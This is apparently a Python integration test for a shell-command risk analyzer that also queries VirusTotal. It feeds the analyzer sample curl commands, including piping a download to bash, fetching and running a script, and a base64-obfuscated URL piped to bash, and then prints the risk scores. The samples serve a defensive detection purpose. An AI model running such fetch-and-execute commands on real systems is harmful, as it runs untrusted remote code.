from engine import analyze_command
import os
import configparser

# Try to load API key from config.ini or environment variable
def get_api_key():
    # Try config file first
    if os.path.exists('config.ini'):
        config = configparser.ConfigParser()
        config.read('config.ini')
        if 'VirusTotal' in config and 'api_key' in config['VirusTotal']:
            return config['VirusTotal']['api_key']
    
    # Try environment variable
    return os.environ.get("VIRUSTOTAL_API_KEY")

# Get API key safely
API_KEY = get_api_key()

if not API_KEY:
    print("WARNING: No VirusTotal API key found.")
    print("Please set up config.ini or VIRUSTOTAL_API_KEY environment variable.")

# Test commands with different risk levels
test_commands = [
    # Safe command with safe URL
    "curl https://www.google.com",
    
    # Command with pipe to bash (suspicious)
    "curl https://www.example.com | bash",
    
    # Command with potentially dangerous domain
    "curl https://pastebin.com/raw/abcdefgh",
    
    # Command with script download
    "curl https://example.com/script.sh -o script.sh && chmod +x script.sh && ./script.sh",
    
    # Command with obfuscation
    "curl -s `echo aHR0cHM6Ly9leGFtcGxlLmNvbS9zY3JpcHQuc2g= | base64 -d` | bash"
]

print("=== ENGINE + VIRUSTOTAL INTEGRATION TEST ===\n")

for i, cmd in enumerate(test_commands, 1):
    print(f"Test #{i}: {cmd}")
    
    # Call analyze_command with API key
    result, score, patterns = analyze_command(cmd, API_KEY)
    
    print(f"Result: {result}")
    print(f"Risk score: {score}")
    
    if patterns:
        print("\nDetected patterns:")
        for pattern in patterns:
            print(f"- {pattern}")
    
    print("\n" + "="*60 + "\n")

print("Tests completed.")
